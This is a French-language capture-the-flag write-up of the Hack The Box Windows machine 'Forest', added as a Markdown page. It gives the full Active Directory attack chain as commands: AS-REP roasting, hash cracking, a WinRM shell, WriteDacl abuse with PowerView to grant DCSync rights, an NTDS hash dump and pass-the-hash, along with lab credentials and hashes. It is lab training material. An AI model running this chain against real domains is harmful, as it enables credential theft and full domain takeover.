@@ -1,0 +1,218 @@
+---
+title: Forest
+description: WU Forest
+categories: [Writeup]
+tags: [writeup]
+template: doc
+sidebar:
+  order: 2
+  badge:
+    text: 'easy'
+    variant: success
+---
+
+| OS | Difficulty | Target |
+|----|----|----|
+| Windows | <span style="color:green">**EASY**</span> | 10.129.4.254 |
+
+## Flags
+
+| Flag | Emplacement |
+|------|-------------|
+| User | `C:\Users\svc-alfresco\Desktop\user.txt` |
+| Root | `C:\Users\Administrator\Desktop\root.txt` |
+
+## Résumé
+
+1. **Énumération LDAP/RPC anonyme** : Découverte des utilisateurs du domaine
+2. **AS-REP Roasting** : Attaque contre svc-alfresco sans pré-authentification
+3. **WinRM Shell** : Accès initial avec les credentials crackés
+4. **Analyse BloodHound** : Mapping des chemins de privilèges
+5. **WriteDacl Abuse** : Exploitation des permissions Exchange
+6. **DCSync** : Dump des hashes pour obtenir Administrator
+
+---
+
+## Configuration Initiale
+
+```bash
+export TARGET=10.129.4.254
+export DOMAIN=htb.local
+export DC=forest.htb.local
+echo "$TARGET forest.htb.local htb.local FOREST" >> /etc/hosts
+getent hosts htb.local
+```
+
+## Reconnaissance
+
+### Scan Nmap
+
+```bash
+nmap -p- $TARGET -sV -sC -oN nmap_full.txt
+```
+
+**Ports critiques identifiés :**
+- 53 (DNS)
+- 88 (Kerberos)
+- 389 (LDAP)
+- 445 (SMB)
+- 636 (LDAPS)
+- 3268 (Global Catalog)
+- 5985 (WinRM)
+- 9389 (mc-nmf - indicateur Exchange)
+
+### Énumération LDAP
+
+Requête du rootDSE :
+```bash
+ldapsearch -x -H ldap://$TARGET -b "" -s base
+```
+
+Récupération de la structure du domaine :
+```bash
+ldapsearch -x -H ldap://$TARGET -b "dc=htb,dc=local" > ldap.txt
+grep "^dn:" ldap.txt | grep -v "CN=Configuration\|CN=Schema\|CN=System"
+```
+
+Filtrage des comptes DONT_REQ_PREAUTH :
+```bash
+ldapsearch -x -H ldap://$TARGET -b "dc=htb,dc=local" \
+  "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" \
+  sAMAccountName userAccountControl
+```
+
+### Énumération RPC
+
+```bash
+enum4linux-ng -A $TARGET > enum4linux.txt
+grep "username:" enum4linux.txt | awk '{print $2}' > users.txt
+```
+
+**Utilisateurs découverts :**
+- sebastien
+- lucinda
+- **svc-alfresco** (ACB: 0x00010210 - vulnérable)
+- andy
+- mark
+- santi
+
+### Analyse des Account Control Bits
+
+La valeur 0x00010210 indique :
+- 0x00000200: NORMAL_ACCOUNT
+- 0x00000010: HOMEDIR_REQUIRED
+- 0x00010000: DONT_REQ_PREAUTH (indicateur de vulnérabilité)
+
+Seul svc-alfresco possédait cette configuration vulnérable.
+
+## Attaque AS-REP Roasting
+
+### Explication de la Vulnérabilité
+
+Quand DONT_REQ_PREAUTH est activé, le KDC répond aux requêtes d'authentification sans valider le demandeur. La réponse contient du matériel chiffré avec le hash NTLM du compte cible, extractible pour un crackage hors ligne.
+
+### Exécution de l'Attaque
+
+```bash
+GetNPUsers.py htb.local/ -no-pass -usersfile users.txt -dc-ip $TARGET
+```
+
+### Crackage du Hash
+
+```bash
+hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+**Résultat :** svc-alfresco / s3rvice
+
+## Accès Initial
+
+### Connexion WinRM
+
+```bash
+evil-winrm -i $TARGET -u svc-alfresco -p s3rvice
+whoami
+# Output: htb\svc-alfresco
+```
+
+## Énumération Post-Exploitation
+
+### Collecte de Données BloodHound
+
+```bash
+netexec ldap $TARGET -u svc-alfresco -p s3rvice \
+  --bloodhound --dns-server $TARGET -c all
+```
+
+### Chemin d'Attaque Découvert
+
+L'analyse révèle : svc-alfresco maintient une appartenance dans Service Accounts, qui appartient à Privileged IT Accounts, qui appartient à Account Operators. Account Operators possède des droits GenericAll sur Exchange Windows Permissions, qui détient des permissions WriteDacl sur l'objet domaine HTB.LOCAL.
+
+## Escalade de Privilèges
+
+### Étape 1 : Charger PowerView
+
+```powershell
+# Depuis l'hôte Linux
+cp /opt/resources/windows/PowerSploit/Recon/PowerView.ps1 /workspace/Forest/
+
+# Depuis la session evil-winrm
+upload PowerView.ps1
+. .\PowerView.ps1
+```
+
+### Étape 2 : Ajouter svc-alfresco à Exchange Windows Permissions
+
+```powershell
+Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco
+Get-DomainGroupMember -Identity "Exchange Windows Permissions"
+```
+
+### Étape 3 : Accorder les Droits DCSync
+
+L'actualisation du token de compte est critique - les tokens NTLM ne se mettent pas à jour dynamiquement. Il faut fournir des credentials frais :
+
+```powershell
+$username = "htb\svc-alfresco"
+$password = "s3rvice"
+$secstr = New-Object -TypeName System.Security.SecureString
+$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
+$cred = new-object -typename System.Management.Automation.PSCredential `
+  -argumentlist $username, $secstr
+
+Add-DomainObjectAcl -Credential $Cred `
+  -PrincipalIdentity 'svc-alfresco' `
+  -TargetIdentity 'DC=htb,DC=local' `
+  -Rights DCSync
+```
+
+Vérification :
+```powershell
+Get-ObjectAcl -DistinguishedName "DC=htb,DC=local" -ResolveGUIDs | `
+  Where-Object {$_.SecurityIdentifier -match "svc-alfresco"}
+```
+
+## Dump DCSync
+
+```bash
+netexec smb $TARGET -u svc-alfresco -p s3rvice --ntds
+```
+
+**Hash Clé Extrait :**
+- Administrator NT Hash: 32693b11e6aa90eb43d32c72a07ceea6
+
+## Attaque Pass-the-Hash
+
+```bash
+evil-winrm -i $TARGET -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
+whoami
+# Output: htb\administrator
+```
+
+## Concepts Techniques Clés
+
+**PrivExchange :** La configuration du serveur Exchange hérite de permissions de domaine élevées, permettant l'abus de WriteDacl pour le dump de credentials.
+
+**Protocole DCSync :** Utilise MS-DRSR (Directory Replication Service) pour simuler la réplication de contrôleur de domaine, nécessitant les permissions DS-Replication-Get-Changes et DS-Replication-Get-Changes-All.
+
+**Exploitation WriteDacl :** Permet la modification des ACL du domaine pour accorder des privilèges arbitraires sans accès direct.
